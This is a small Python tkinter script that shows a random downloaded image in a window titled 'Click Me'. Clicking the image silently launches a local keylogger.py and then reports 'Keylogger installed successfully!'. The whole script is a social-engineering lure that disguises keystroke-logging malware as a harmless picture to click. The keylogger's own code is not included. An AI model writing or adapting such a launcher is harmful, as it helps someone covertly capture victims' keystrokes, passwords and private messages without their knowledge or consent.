import tkinter as tk
from tkinter import messagebox
import os
import requests
from io import BytesIO
from PIL import Image, ImageTk  # For handling images

def install_keylogger(event=None):
    if os.name == "nt":  # For Windows
        os.system("python keylogger.py")
    else:  # For Unix-based systems
        os.system("python3 keylogger.py")
    messagebox.showinfo("Success", "Keylogger installed successfully!")

# Create the main window
root = tk.Tk()
root.title("Click Me")

# Download the image from the URL
url = "https://picsum.photos/200/300"
response = requests.get(url)
if response.status_code == 200:
    image_data = BytesIO(response.content)
    pil_image = Image.open(image_data)
else:
    messagebox.showerror("Error", "Failed to download the image.")
    root.destroy()
    exit()

# Convert the PIL image to a Tkinter-compatible image
tk_image = ImageTk.PhotoImage(pil_image)

# Create a label with the image
image_label = tk.Label(root, image=tk_image)
image_label.pack()

# Bind the click event to the install_keylogger function
image_label.bind("<Button-1>", install_keylogger)

# Start the main loop
root.mainloop()
